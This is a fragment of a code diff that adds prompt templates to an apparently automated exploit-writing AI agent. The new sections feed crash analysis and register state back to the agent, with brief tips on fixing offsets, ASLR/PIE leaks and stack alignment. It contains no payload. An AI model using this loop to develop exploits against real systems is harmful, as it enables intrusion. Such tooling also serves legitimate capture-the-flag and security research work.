+## ⚠️ EXPLOIT FAILURE ANALYSIS (CRITICAL - READ THIS FIRST!)
+
+The previous exploit attempt **FAILED**. Here is the crash analysis:
+
+### Crash Reason
+{{ crash_analysis.crash_reason | default("Unknown") }}
+
+### Detected Issues
+{% for issue in crash_analysis.exploit_issues %}
+- {{ issue }}
+{% endfor %}
+
+### Recommendations to Fix
+{% for rec in crash_analysis.recommendations %}
+- {{ rec }}
+{% endfor %}
+
+### Register State at Crash
+{% if crash_analysis.registers %}
+{% for reg, val in crash_analysis.registers.items() %}
+- {{ reg }}: {{ val }}
+{% endfor %}
+{% endif %}
+
+### Previous Exploit Attempts: {{ exploit_attempts | default(0) }}
+
+**YOUR PRIORITY**: Fix the exploit based on the crash analysis above!
+- If offset is wrong → recalculate or verify with cyclic pattern
+- If address is invalid → check PIE/ASLR, verify leak is correct
+- If alignment issue → add 'ret' gadget before call
+
+---
+{% endif %}
+
 ## Feedback from Previous Iteration
 {% if feedback %}
 {{ feedback }}
@@ -1160,7 +1876,12 @@ PLAN_USER = env.from_string("""## Current Analysis Document
 
 ---
 
+{% if crash_analysis and crash_analysis.performed %}
+Based on the **CRASH ANALYSIS** above, create tasks to fix the exploit.
+Focus on: {{ crash_analysis.recommendations[0] | default("verifying offset and addresses") }}
+{% else %}
 Based on the Analysis Document above, identify [NOT YET] sections and create tasks to fill them.
+{% endif %}
 Output your response in JSON format.
 """)
 
@@ -1447,6 +2168,8 @@ def _build_user_context(agent: str, state: SolverState, extra: Dict) -> Dict[str
             "analysis_document": analysis_doc,
             "feedback": state.get("feedback_output", {}).get("text", ""),
             "tasks": state.get("tasks", []),
+            "crash_analysis": state.get("crash_analysis", {}),
+            "exploit_attempts": state.get("exploit_attempts", 0),
             **extra
         }
 
